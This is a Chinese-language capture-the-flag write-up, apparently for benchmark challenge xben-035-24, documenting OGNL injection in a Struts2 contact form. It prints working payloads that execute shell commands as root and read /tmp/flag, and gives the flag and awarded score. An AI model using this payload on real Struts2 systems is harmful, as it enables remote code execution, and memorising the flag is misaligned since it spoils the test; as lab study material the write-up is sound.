# xben-035-24 · 探索记录

对应题解：[`xben-035-24.md`](./xben-035-24.md)

## 目标与起点

容器 `10.0.173.136:8080`，响应头：

```http
Set-Cookie: JSESSIONID=0B9772F4DED0704C246BFC5B249B5260; Path=/; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
Content-Language: en
```

页面 `Customer service contact form`，一个 textarea 表单：

```html
<form action="/sendMessageAction.action;jsessionid=…" method="post">
  <textarea name="message"></textarea>
</form>
```

`.action` + `wwFormTable` 是 Struts2 的典型特征。

## 第一阶段：OGNL 探测

| message | 回显 |
| --- | --- |
| `%{7*7}` | **49** |
| `${7*7}` | **49** |
| `#{7*7}` | 空 |

表达式被求值 → OGNL 注入成立。

## 第二阶段：静态方法可用性

```bash
message=%{@java.lang.System@getProperty("user.dir")}
```

```html
<h2>Your message:</h2>
<p>/usr/local/tomcat</p>
```

`java.lang.System` 的静态方法可以直接调用（没有成员访问限制），
说明不需要走 `#_memberAccess` 绕过。

## 第三阶段：命令执行

```bash
message=%{new java.util.Scanner(@java.lang.Runtime@getRuntime().exec('id')
        .getInputStream()).useDelimiter('\\A').next()}
```

```text
Your message:
uid=0(root) gid=0(root) groups=0(root)
```

`Runtime.exec` 按空格切分命令，`ls /`、`find …`、`cat /tmp/flag` 都能直接跑。

## 第四阶段：找 flag

```bash
ls /                                        # 根目录没有 flag
find / -maxdepth 3 -iname '*flag*'          # /proc/kpageflags、/tmp/flag
cat /tmp/flag
# flag{1bc99a6e-d9bd-4c38-8cc1-6d0dcc1d2f7e}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `#{7*7}` | 空 | 这种写法在当前 OGNL/Struts 版本下不生效，改用 `%{}` 或 `${}` |
| `ls /` 找 flag | 看不到 | flag 在 `/tmp/flag`，需要 `find` |

## 这次真正的收获

1. **`.action` 后缀和 `wwFormTable` 是 Struts2 的指纹。** 一旦确认，第一件事就是
   `%{7*7}` / `${7*7}`；回显 `49` 比任何目录扫描都直接。
2. **先测静态方法能不能用，再决定要不要写绕过。** 本题 `@java.lang.System@getProperty`
   直接回显，说明没有 `SecurityMemberAccess`，于是省掉了整段 `#_memberAccess` 载荷。
3. **回显式 RCE 比反弹 shell 简单。** `Scanner(process.getInputStream())
   .useDelimiter("\\A").next()` 把 stdout 读成字符串放进页面，
   不依赖出网、不需要监听端。
4. **`exec(String)` 按空格分词。** `cat /tmp/flag` 这种两段命令正好可用；
   带引号或多段参数的场景才需要 `exec(String[])`。
5. **拿到 root 也要先 `find`。** 这题 flag 在 `/tmp/flag`，
   `ls /`、`ls /root` 都看不到。
